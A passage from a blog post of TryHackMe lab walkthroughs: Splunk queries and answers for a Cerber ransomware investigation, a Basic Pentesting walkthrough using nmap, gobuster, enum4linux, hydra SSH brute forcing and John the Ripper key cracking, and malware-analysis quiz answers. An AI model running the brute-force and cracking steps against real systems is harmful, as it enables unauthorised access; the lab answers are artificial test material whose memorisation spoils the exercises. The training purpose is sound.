+<span class="c"># Results:</span>
+<span class="c"># _time	                    http.http_method	    http.hostname	            http.url</span>
+<span class="c"># 2016-08-24 16:48:13.492	GET	                    solidaritedeproximite.org	/mhtr.jpg</span>
+Answer: mhtr.jpg
+
+
+
+<span class="c">#8 What is the parent process ID of 121214.tmp?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 121214.tmp <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</span> <span class="nv">CommandLine</span><span class="o">=</span><span class="k">*</span>
+| table _time, CommandLine, ProcessId, ParentCommandLine, ParentProcessId
+| reverse
+<span class="c"># _time	                CommandLine	                                                ProcessId	ParentCommandLine	ParentProcessId</span>
+<span class="c"># 2016-08-24 16:48:21	“C:32.exe” /C START "" “C:.smith.WAYNECORPINC\121214.tmp”	1476	“C:32.exe” “C:.smith.WAYNECORPINC\20429.vbs”	3968</span>
+<span class="c"># 2016-08-24 16:48:21	“C:.smith.WAYNECORPINC\121214.tmp”	2948	“C:32.exe” /C START "" “C:.smith.WAYNECORPINC\121214.tmp”	1476</span>
+<span class="c"># 2016-08-24 16:48:29	“C:.smith.WAYNECORPINC\121214.tmp”	3828	“C:.smith.WAYNECORPINC\121214.tmp”	2948</span>
+<span class="c"># 2016-08-24 16:48:41	“C:.smith.WAYNECORPINC{35ACA89F-933F-6A5D-2776-A3589FB99832}.exe”	3836	“C:.smith.WAYNECORPINC\121214.tmp”	3828</span>
+<span class="c"># 2016-08-24 16:48:41	/d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:.smith.WAYNECORPINC\121214.tmp” &gt; NUL	1280	“C:.smith.WAYNECORPINC\121214.tmp”	3828</span>
+<span class="c"># 2016-08-24 16:48:41	taskkill /t /f /im “121214.tmp”	1684	/d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:.smith.WAYNECORPINC\121214.tmp” &gt; NUL	1280</span>
+<span class="c"># 2016-08-24 16:48:42	ping -n 1 127.0.0.1	556	/d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:.smith.WAYNECORPINC\121214.tmp” &gt; NUL	1280</span>
+Answer: 3968
+
+
+
+<span class="c">#9 Amongst the Suricata signatures that detected the Cerber malware, which signature ID alerted the fewest number of times?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 cerber <span class="nv">sourcetype</span><span class="o">=</span>suricata
+| stats count by alert.signature, alert.signature_id
+| <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># alert.signature	                                            alert.signature_id	count</span>
+<span class="c"># ETPRO TROJAN Ransomware/Cerber Checkin Error ICMP Response	2816764	            2</span>
+<span class="c"># ETPRO TROJAN Ransomware/Cerber Onion Domain Lookup	        2820156	            2</span>
+<span class="c"># ETPRO TROJAN Ransomware/Cerber Checkin 2	                    2816763	            1</span>
+Answer: 2816763
+
+
+
+<span class="c">#10 The Cerber ransomware encrypts files located in Bob Smith's Windows profile. How many .txt files does it encrypt?</span>
+<span class="c"># First run the following request:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">host</span><span class="o">=</span>we8105desk <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</span> <span class="k">*</span>.txt
+| stats count by TargetFilename
+<span class="c"># We see that the ransomware crypts files in several locations.</span>
+<span class="c"># To focus on Bob Smith’s Windows profile, filter *.txt files in Bob Smith’s home folder:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">host</span><span class="o">=</span>we8105desk <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</span> <span class="nv">TargetFilename</span><span class="o">=</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">bob.smith.WAYNECORPINC</span><span class="se">\\</span><span class="s2">*.txt"</span>
+| stats dc<span class="o">(</span>TargetFilename<span class="o">)</span>
+Answer: 406
+
+
+
+<span class="c">#11 How many distinct PDFs did the ransomware encrypt on the remote file server?</span>
+<span class="c"># The majority of logs related to PDF is in the wineventlog sourcetype:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="k">*</span>.pdf
+| stats count by sourcetype
+| <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># Results:</span>
+<span class="c"># sourcetype	                                        count</span>
+<span class="c"># wineventlog	                                        527</span>
+<span class="c"># stream:smb	                                        283</span>
+<span class="c"># XmlWinEventLog:Microsoft-Windows-Sysmon/Operational	50</span>
+<span class="c"># WinRegistry	                                        3</span>
+<span class="c"># stream:http	                                        1</span>
+
+<span class="c"># There are 2 distinct destinations:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="k">*</span>.pdf <span class="nv">sourcetype</span><span class="o">=</span>wineventlog
+|  stats count by dest
+|  <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># dest	                        count</span>
+<span class="c"># we9041srv.waynecorpinc.local	526</span>
+<span class="c"># we8105desk.waynecorpinc.local	1</span>
+
+<span class="c"># The most probable one is the first name. target the source address:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="k">*</span>.pdf <span class="nv">sourcetype</span><span class="o">=</span>wineventlog   <span class="nv">dest</span><span class="o">=</span><span class="s2">"we9041srv.waynecorpinc.local"</span>
+|  stats count by Source_Address
+|  <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># Source_Address	count</span>
+<span class="c"># 192.168.250.100	525</span>
+<span class="c"># 192.168.2.50     	1</span>
+
+<span class="c"># The first IP was the one found in the beginning of our investigation for the remote file server.</span>
+<span class="c"># Now, we should be able to know how many PDF files have been encrypted on the remove file server:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span>wineventlog <span class="nv">dest</span><span class="o">=</span><span class="s2">"we9041srv.waynecorpinc.local"</span> <span class="nv">Source_Address</span><span class="o">=</span><span class="s2">"192.168.250.100"</span> <span class="nv">Relative_Target_Name</span><span class="o">=</span><span class="s2">"*.pdf"</span>
+| stats dc<span class="o">(</span>Relative_Target_Name<span class="o">)</span>
+Answer: 257
+
+
+
+<span class="c">#12 What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?</span>
+<span class="c"># We already identified the domains at question #6:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"192.168.250.100"</span> <span class="nv">sourcetype</span><span class="o">=</span>stream:dns <span class="nv">record_type</span><span class="o">=</span>A NOT <span class="o">(</span>query<span class="o">{}=</span><span class="s2">"*microsoft.com"</span> OR query<span class="o">{}=</span><span class="s2">"wpad"</span> OR query<span class="o">{}=</span><span class="s2">"*.waynecorpinc.local"</span> OR query<span class="o">{}=</span><span class="s2">"isatap"</span> OR query<span class="o">{}=</span><span class="s2">"*bing.com"</span> OR query<span class="o">{}=</span><span class="s2">"*windows.com"</span> OR query<span class="o">{}=</span><span class="s2">"*msftncsi.com"</span><span class="o">)</span>
+| table _time, query<span class="o">{}</span>
+| <span class="nb">sort </span>by _time
+<span class="c"># Results:</span>
+<span class="c"># _time	query{}</span>
+<span class="c"># 2016-08-24 16:48:12.267	solidaritedeproximite.org</span>
+<span class="c">#                           solidaritedeproximite.org</span>
+<span class="c"># 2016-08-24 16:49:24.308	ipinfo.io</span>
+<span class="c">#                           ipinfo.io</span>
+<span class="c"># 2016-08-24 17:15:12.668	cerberhhyed5frqa.xmfir0.win</span>
+<span class="c">#                           cerberhhyed5frqa.xmfir0.win</span>
+<span class="c"># At the end of the encryption process, the user is redirected to cerberhhyed5frqa.xmfir0.win.</span>
+
+</pre></table></code></div></div><p>Summary</p><ul><li>User (or someone) inserted an infected USB drive into Bob Smith’s workstation (not sure why!?!)<li>Word document spawned a Suspicious Process which spawned additional processes<li>File was downloaded after calls were made to a FQDN and IP address<li>Encryption of files begin on both local disk and shares<li>Redirection to an external site with notification of encryption occurred</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/ExTJF7w.png" alt="1000px-Ctf-tryhackme-BP-Splunk-RW-threatpic-all" /></p><hr /><h1 id="thm---basic-pentesting">THM - Basic Pentesting</h1><p>Task 1 Web App Testing and Privilege Escalation</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>
+ping 10.10.100.180
+
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 0oN 10.10.100.180
+<span class="c"># open port:</span>
+<span class="c"># 22</span>
+<span class="c"># 80</span>
+<span class="c"># 139</span>
+<span class="c"># 445</span>
+
+
+<span class="c"># What is the name of the hidden directory on the web server(enter name without /)?</span>
+broswer <span class="o">&gt;</span> develper page
+gobuster <span class="nt">-w</span> /usr/share/dirbuster/wordlists/wordlist.txt <span class="nt">-u</span> http://10.10.100.180/
+show /development
+
+
+<span class="c"># User brute-forcing to find the username &amp; password</span>
+enum4linux <span class="nt">-a</span> 10.10.100.180
+kay
+jan
+
+
+<span class="c"># What is the password?</span>
+hydra <span class="nt">-l</span> jan <span class="nt">-P</span> rockyou.txt ssh://10.10.100.180
+
+
+<span class="c"># What service do you use to access the server(answer in abbreviation in all caps)?</span>
+SSH
+
+<span class="c"># Enumerate the machine to find any vectors for privilege escalation</span>
+<span class="nb">chmod</span> +x linpeas.sh
+linpeas.sh
+got the ssh of kay
+/opt/JohnTheRipper/run/ssh2john.py kay_id_rsa <span class="o">&gt;</span> sshpass.txt
+/opt/JohnTheRipper/run/john sshpass.txt
+/opt/JohnTheRipper/run/john sshpass.txt <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt
+login to kay
+<span class="nb">cat </span>pass.bak
+
+heresareallystrongpasswordthatdollowsthepasswordpolicy<span class="nv">$$</span>
+</pre></table></code></div></div><hr /><h1 id="thm---mal-malware-introductory">THM - MAL: Malware Introductory</h1><ol><li>Delivery<li>Execution<li>Maintaining Persistence<li>Persistence<li>Propagation</ol><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="c"># What is the famous example of a targeted attack-esque Malware that targeted Iran?</span>
+Stuxnet
+
+<span class="c"># What is the name of the Ransomware that used the Eternalblue exploit in a "Mass Campaign" attack?</span>
+WannaCry
+</pre></table></code></div></div><p>Static Analysis Tools:</p><ul><li>Dependency Walker (depends)<li>PeID<li>PE Explorer<li>PEview<li>ResourceHacker<li>IDA Freeware<li>WinDbg<li>ResourceHacker</ul><p><strong>Connecting to the Windows Analysis Environment (Deploy)</strong></p><p>MACHINE_IP</p><ul><li>Domain: ANALYSIS-PC<li>Username: Analysis<li>Password: tryhackme</ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre><span class="c"># The MD5 Checksum of aws.exe</span>
+D2778164EF643BA8F44CC202EC7EF157
+
+<span class="c"># The MD5 Checksum of Netlogo.exe</span>
+59CB421172A89E1E16C11A428326952Cc
+
+<span class="c"># The MD5 Checksum of vlc.exe</span>
+5416BE1B8B04B1681CB39CF0E2CAAD9F
+
+<span class="c"># What does PeID propose 1DE9176AD682FF.dll being packed with?</span>
+Microsoft Visual C++ 6.0 DLL
+
+<span class="c"># What does PeID propose AD29AA1B.bin being packed with?</span>
+Microsoft Visual C++ 6.0
+
+<span class="c"># What packer does PeID report file "6F431F46547DB2628" to be packed with?</span>
+FSG 1.0 -&gt; dulek/xt
+
+
+<span class="c"># strings "C:\Users\Analysis\Desktop\Tasks\Task 12\filename"</span>
+<span class="c"># What is the URL that is outputted after using "strings"</span>
+practicalmalwareanalysis.com
+<span class="c"># How many unique "Imports" are there?</span>
+5
+
+<span class="c"># What is the MD5 Checksum of the file?</span>
+F5BD8E6DC6782ED4DFA62B8215BDC429
+<span class="c"># Does Virustotal report this file as malicious? (Yay/Nay)</span>
+Yay
+<span class="c"># Output the strings using Sysinternals "strings" tool.</span>
+<span class="c"># What is the last string outputted?</span>
+d:h:
+<span class="c"># What is the output of PeID when trying to detect what packer is used by thefile?</span>
+Nothing found
+</pre></table></code></div></div><hr /><p>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/lab/'>Lab</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lab - TryHackMe - Entry Walkthrough - Grace&url=https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lab - TryHackMe - Entry Walkthrough - Grace&u=https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Lab - TryHackMe - Entry Walkthrough - Grace&url=https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CI-CD/">CI/CD - Continuous Integration & Continous Delivery</a><li><a href="/posts/Github-Action-example/">CI/CD - Github Action Template</a><li><a href="/posts/CloudMap/">AWS - EKS - Cloud Map</a><li><a href="/posts/DataWrangler/">AWS - ML - Data Wrangler</a><li><a href="/posts/0CodePipeline/">AWS - CodeDevelop - CodePipeline</a><li><a href="/posts/1CodeCommit/">AWS - CodeDevelop - CodeCommit</a><li><a href="/posts/2CodeBuild/">AWS - CodeDevelop - CodeBuild</a><li><a href="/posts/2CodeBuildTemplate-buildspec/">AWS - CodeDevelop - CodeBuild - buildspec.yml Template</a><li><a href="/posts/ElasticBeanstalk/">AWS - CodeDevelop - ElasticBeanstalk</a><li><a href="/posts/CourseREADME/">Course - Learning Path</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/soc/">SOC</a> <a class="post-tag" href="/tags/network/">Network</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TrafficAnalysisExe/"><div class="card-body"> <span class="timeago small" > Nov 8, 2020 <i class="unloaded">2020-11-08T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - TRAFFIC ANALYSIS EXERCISES</h3><div class="text-muted small"><p> [toc] TRAFFIC ANALYSIS EXERCISES TRAFFIC ANALYSIS EXERCISES password: infected 2020-03-14 – Traffic analysis exercise - Mondogreek 2020-02-21 – Traffic analysis exercise - All aboard the hot m...</p></div></div></a></div><div class="card"> <a href="/posts/codesignal/"><div class="card-body"> <span class="timeago small" > Nov 8, 2020 <i class="unloaded">2020-11-08T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - CodeSignal Arcade Universe</h3><div class="text-muted small"><p> [toc] CodeSignal Arcade Universe Intro Smooth Sailing All Longest Strings // Given an array of strings, return another array containing all of its longest strings. // Example // For ...</p></div></div></a></div><div class="card"> <a href="/posts/hankthebox/"><div class="card-body"> <span class="timeago small" > Nov 13, 2020 <i class="unloaded">2020-11-13T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - HTB - Setup</h3><div class="text-muted small"><p> Lab - HTB - Setup starting point invite Lab - HTB - Setup starting point Connections to the lab environment are made with OpenVPN, which comes pre-installed on Par...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/codesignal/" class="btn btn-outline-primary" prompt="Older"><p>Lab - CodeSignal Arcade Universe</p></a> <a href="/posts/CI-CD/" class="btn btn-outline-primary" prompt="Newer"><p>CI/CD - Continuous Integration & Continous Delivery</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//https-ocholuo-github-io.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Lab - TryHackMe - Entry Walkthrough'; this.page.url = 'https://ocholuo.github.io//posts/TryHackMe-EntryWalkthrough/'; this.page.identifier = '/posts/TryHackMe-EntryWalkthrough/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/soc/">SOC</a> <a class="post-tag" href="/tags/network/">Network</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
